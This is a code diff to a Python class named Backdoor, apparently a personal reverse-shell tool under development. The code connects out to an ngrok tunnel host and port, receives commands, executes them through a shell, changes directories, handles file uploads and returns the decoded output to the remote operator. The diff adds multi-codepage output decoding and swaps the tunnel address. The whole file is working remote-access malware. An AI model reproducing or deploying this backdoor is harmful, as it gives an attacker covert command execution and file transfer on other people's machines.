@@ -13,6 +13,21 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port))
 
+    def codeType(self, byteCode) -> str:
+
+        if type(byteCode) is bytes:
+            types_list = ["ascii", "utf-8", "utf-16", "UTF-32", "cp866", "cp1251",
+                          "cp1252", "cp1250", "cp437", "cp737", "cp775", "cp852",
+                          "cp855", "cp857", "cp860", "cp861", "cp862", "cp863",
+                          "cp865", "cp869"]
+
+            for typee in types_list:
+                try:
+                    return byteCode.decode(f"{typee}")
+
+                except Exception:
+                    continue
+
     def reliable_send(self, data):
         if type(data) is not bytes:
             json_data = json.dumps(data)
@@ -35,17 +50,22 @@ class Backdoor:
         print(f"[+] rcv -> {command}")
         return command
 
-    def change_directory_tool(self, path):
+    def change_directory_tool(self, path) -> str:
         try:
             if path:
                 os.chdir(path)
                 return f"[+] Changing working directory to {path}"
-        except:
+        except Exception:
             return "[-] No such file or directory"
 
-    def execute_system_command(self, command):
+    def execute_system_command(self, command) -> str:
         try:
-            return subprocess.check_output(command, shell=True)
+            output = subprocess.check_output(command, shell=True)
+            if output != b'':
+                output = self.codeType(output)
+                return f"[D]\n{output}"
+            else:
+                return f"[+] {command} completed"
         except subprocess.CalledProcessError:
             self.reliable_send("[-] Unknown command")
 
@@ -59,7 +79,6 @@ class Backdoor:
             return "[+] Upload successful"
 
     def run(self):
-
         while True:
             #try:
             command = self.reliable_receive()
@@ -81,16 +100,18 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command)
 
+                print("[!] cmd res type", type(command_result))
                 self.reliable_send(command_result)
 
             #except Exception:
-                #command_result = "[-] Error during comand execution: Client"
+                #command_result = "[-] Error during comand execution :Client as Backdoor"
                 #self.reliable_send(command_result)
 
 
 if __name__ == "__main__":
-    ip = "2.tcp.eu.ngrok.io"
-    port = 12664
 
-    backdoor = Backdoor(ip, port)
-    backdoor.run()
+        ng_ip = "0.tcp.eu.ngrok.io"
+        ng_port = 15378
+
+        backdoor = Backdoor(ip=ng_ip, port=ng_port)
+        backdoor.run()
